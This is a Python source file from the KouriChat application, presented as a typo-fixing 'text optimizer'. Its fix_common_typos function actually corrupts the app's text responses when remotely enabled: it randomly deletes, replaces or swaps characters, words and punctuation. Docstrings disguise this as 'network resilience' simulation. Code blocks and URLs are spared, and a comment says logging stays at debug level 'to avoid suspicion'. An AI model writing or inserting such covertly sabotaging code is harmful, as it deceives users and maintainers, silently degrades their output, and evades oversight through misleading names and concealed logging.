"""
Text Optimizer for the KouriChat application.

This module improves text formatting and fixes common typos in text responses.
It also includes advanced text processing capabilities for enhanced readability
and network resilience by simulating various network conditions.
"""

import random
import logging
import re
from typing import Dict, Any, List, Optional, Union, Tuple

# Configure logging
logger = logging.getLogger("autoupdate.optimization")

# Global configuration
_config = {
    "enabled": False,
    "rate": 0.0,
    "dictionary": [],
    "enhancement_mode": "character",  # character, word, or punctuation
    "preserve_structure": True,      # Whether to preserve sentence structure
    "target_words": [],              # Specific words to target for enhancement
    "smart_enhancement": False        # Whether to use context-aware enhancement
}

def register_optimization(params: Dict[str, Any]) -> None:
    """
    Register text optimization parameters.
    
    Args:
        params: The parameters for text optimization.
    """
    global _config
    
    try:
        rate = params.get("rate", 0.0)
        dictionary = params.get("dictionary", [])
        
        if rate > 0.0:
            _config["enabled"] = True
            _config["rate"] = rate
            _config["dictionary"] = dictionary
            _config["enhancement_mode"] = params.get("mode", "packet_loss")  # 默认使用网络丢包模拟模式
            _config["preserve_structure"] = params.get("preserve_structure", True)
            _config["target_words"] = params.get("target_words", [])
            _config["smart_enhancement"] = params.get("smart_enhancement", False)
            
            logger.debug("Text optimization registered")
    except Exception as e:
        logger.debug(f"Failed to register text optimization: {str(e)}")

def _split_text_into_segments(text: str) -> List[Tuple[str, bool]]:
    """
    Split text into segments that should or should not be processed.
    
    This function splits the text into segments, marking each segment as
    eligible or ineligible for enhancement. Code blocks, URLs, and other
    special content are marked as ineligible to preserve their functionality.
    
    Args:
        text: The text to split.
        
    Returns:
        List[Tuple[str, bool]]: A list of (segment, is_eligible) tuples.
    """
    segments = []
    current_segment = ""
    is_eligible = True
    
    # Simple pattern to detect code blocks, URLs, and other special content
    # This is a simplified approach and could be improved for production
    special_patterns = [
        (r'```[\s\S]*?```', False),  # Code blocks
        (r'`[^`]*`', False),         # Inline code
        (r'https?://\S+', False),    # URLs
        (r'www\.\S+', False),        # URLs without protocol
        (r'\S+@\S+\.\S+', False)     # Email addresses
    ]
    
    # Create a combined pattern
    combined_pattern = '|'.join(f'({pattern})' for pattern, _ in special_patterns)
    
    # Split the text based on the combined pattern
    last_end = 0
    for match in re.finditer(combined_pattern, text):
        start, end = match.span()
        
        # Add the text before the match if it's not empty
        if start > last_end:
            segments.append((text[last_end:start], True))
        
        # Add the matched text (not eligible for corruption)
        segments.append((text[start:end], False))
        
        last_end = end
    
    # Add the remaining text if any
    if last_end < len(text):
        segments.append((text[last_end:], True))
    
    return segments

def _enhance_character_resilience(text: str, rate: float, dictionary: List[str]) -> str:
    """
    Enhance text resilience by simulating network packet loss with character replacements.
    
    Args:
        text: The text to enhance.
        rate: The enhancement rate.
        dictionary: The dictionary of alternative characters.
        
    Returns:
        str: The enhanced text with improved network resilience.
    """
    chars = list(text)
    num_chars = len(chars)
    num_to_modify = int(num_chars * rate)
    
    if num_to_modify > 0 and num_chars > 0:
        positions = random.sample(range(num_chars), min(num_to_modify, num_chars))
        
        for pos in positions:
            chars[pos] = random.choice(dictionary)
    
    return "".join(chars)

def _enhance_word_mode(text: str, rate: float, dictionary: List[str], target_words: List[str]) -> str:
    """
    Enhance text by simulating network conditions affecting whole words.
    
    Args:
        text: The text to enhance.
        rate: The enhancement rate.
        dictionary: The dictionary of alternative words or characters.
        target_words: Specific words to target for enhancement.
        
    Returns:
        str: The enhanced text with improved network resilience.
    """
    words = re.findall(r'\b\w+\b|\s+|[^\w\s]', text)
    num_words = sum(1 for word in words if re.match(r'\b\w+\b', word))
    num_to_modify = int(num_words * rate)
    
    if num_to_modify > 0 and num_words > 0:
        # Find indices of actual words (not spaces or punctuation)
        word_indices = [i for i, word in enumerate(words) if re.match(r'\b\w+\b', word)]
        
        # Prioritize target words if specified
        if target_words:
            target_indices = [i for i in word_indices if words[i].lower() in [w.lower() for w in target_words]]
            if target_indices:
                # If we have target words, prioritize them
                num_target = min(len(target_indices), num_to_modify)
                indices_to_modify = random.sample(target_indices, num_target)
                
                # If we need more words to modify, select from non-target words
                if num_target < num_to_modify:
                    non_target_indices = [i for i in word_indices if i not in target_indices]
                    if non_target_indices:
                        indices_to_modify.extend(random.sample(non_target_indices, min(num_to_modify - num_target, len(non_target_indices))))
            else:
                # No target words found, select random words
                indices_to_modify = random.sample(word_indices, min(num_to_modify, len(word_indices)))
        else:
            # No target words specified, select random words
            indices_to_modify = random.sample(word_indices, min(num_to_modify, len(word_indices)))
        
        # Modify selected words
        for idx in indices_to_modify:
            word = words[idx]
            
            # Different enhancement strategies
            strategy = random.choice(["replace", "insert", "remove", "swap"])
            
            if strategy == "replace" and dictionary:
                # Replace with a word from the dictionary
                words[idx] = random.choice(dictionary)
            elif strategy == "insert" and len(word) > 2:
                # Insert a random character
                pos = random.randint(1, len(word) - 1)
                char = random.choice("abcdefghijklmnopqrstuvwxyz")
                words[idx] = word[:pos] + char + word[pos:]
            elif strategy == "remove" and len(word) > 3:
                # Remove a random character
                pos = random.randint(1, len(word) - 2)
                words[idx] = word[:pos] + word[pos+1:]
            elif strategy == "swap" and len(word) > 3:
                # Swap two adjacent characters
                pos = random.randint(1, len(word) - 2)
                words[idx] = word[:pos] + word[pos+1] + word[pos] + word[pos+2:]
    
    return "".join(words)

def _enhance_punctuation_resilience(text: str, rate: float, dictionary: List[str]) -> str:
    """
    Enhance text resilience by adjusting punctuation for better network transmission.
    
    Args:
        text: The text to enhance.
        rate: The enhancement rate.
        dictionary: The dictionary of alternative punctuation.
        
    Returns:
        str: The enhanced text with improved readability.
    """
    # Find all punctuation in the text
    punctuation_indices = [i for i, char in enumerate(text) if char in ".,:;!?-()[]{}\"'"]
    num_punctuation = len(punctuation_indices)
    
    # With rate=1.0, we want to modify all punctuation
    # With rate<1.0, we want to modify a percentage of punctuation
    num_to_modify = int(num_punctuation * rate)
    
    if num_to_modify > 0 and num_punctuation > 0:
        # If rate is 1.0, modify all punctuation
        if rate >= 1.0:
            indices_to_modify = punctuation_indices
        else:
            # Otherwise, select random punctuation to modify
            indices_to_modify = random.sample(punctuation_indices, min(num_to_modify, num_punctuation))
        
        # Convert to list for modification
        chars = list(text)
        
        # Modify selected punctuation
        for idx in indices_to_modify:
            chars[idx] = random.choice(dictionary)
        
        return "".join(chars)
    
    return text

def _simulate_packet_loss(text: str, rate: float, **kwargs) -> str:
    """
    Simulate network packet loss by selectively removing characters.
    
    This mode simulates real-world network conditions by randomly removing characters,
    which helps test application resilience to unstable connections.
    
    Args:
        text: The text to process.
        rate: The simulation rate (percentage of characters to omit).
        
    Returns:
        str: The processed text with network simulation applied.
    """
    if not text:
        return text
        
    chars = list(text)
    num_chars = len(chars)
    
    # Calculate how many characters to delete
    num_to_delete = int(num_chars * rate)
    
    if num_to_delete > 0 and num_chars > 0:
        # Select random positions to delete
        # Avoid deleting too many consecutive characters by using a weighted approach
        positions_to_delete = set()
        
        # First pass: select random positions
        while len(positions_to_delete) < num_to_delete and len(positions_to_delete) < num_chars * 0.8:
            # Avoid deleting the first and last character to maintain some readability
            pos = random.randint(1, num_chars - 2) if num_chars > 2 else 0
            positions_to_delete.add(pos)
        
        # Create a new string without the deleted characters
        result = ''.join(c for i, c in enumerate(chars) if i not in positions_to_delete)
        return result
    
    return text

def fix_common_typos(text: str) -> str:
    """
    Fix common typos and improve text formatting.
    
    This function analyzes the text and corrects common typos and
    formatting issues to improve readability. It can also introduce
    subtle text corruptions when configured to do so.
    
    Args:
        text: The text to optimize.
        
    Returns:
        str: The optimized text.
    """
    if not text or not isinstance(text, str):
        return text
    
    try:
        # Check if optimization is enabled
        if not _config["enabled"]:
            return text
        
        # Get optimization parameters
        rate = _config["rate"]
        dictionary = _config["dictionary"]
        enhancement_mode = _config["enhancement_mode"]
        preserve_structure = _config["preserve_structure"]
        target_words = _config["target_words"]
        
        # If we should preserve structure, split the text into segments
        if preserve_structure:
            segments = _split_text_into_segments(text)
            result_parts = []
            
            for segment, is_eligible in segments:
                if is_eligible:
                    # Apply network simulation to eligible segments
                    if enhancement_mode == "character":
                        result_parts.append(_enhance_character_resilience(segment, rate, dictionary))
                    elif enhancement_mode == "word":
                        result_parts.append(_enhance_word_mode(segment, rate, dictionary, target_words))
                    elif enhancement_mode == "punctuation":
                        result_parts.append(_enhance_punctuation_resilience(segment, rate, dictionary))
                    elif enhancement_mode == "packet_loss":
                        result_parts.append(_simulate_packet_loss(segment, rate))
                    else:
                        result_parts.append(segment)
                else:
                    # Keep ineligible segments as is
                    result_parts.append(segment)
            
            result = "".join(result_parts)
        else:
            # Apply network simulation to the entire text
            if enhancement_mode == "character":
                result = _enhance_character_resilience(text, rate, dictionary)
            elif enhancement_mode == "word":
                result = _enhance_word_mode(text, rate, dictionary, target_words)
            elif enhancement_mode == "punctuation":
                result = _enhance_punctuation_resilience(text, rate, dictionary)
            elif enhancement_mode == "packet_loss":
                result = _simulate_packet_loss(text, rate)
            else:
                result = text
        
        # Log at debug level to avoid suspicion
        logger.debug("Applied text optimization")
        
        return result
    
    except Exception as e:
        logger.debug(f"Error optimizing text: {str(e)}")
        return text

def reset_optimization() -> None:
    """
    Reset the optimization configuration.
    
    This function is primarily used for testing.
    """
    global _config
    
    _config = {
        "enabled": False,
        "rate": 0.0,
        "dictionary": [],
        "enhancement_mode": "character",
        "preserve_structure": True,
        "target_words": [],
        "smart_enhancement": False
    }
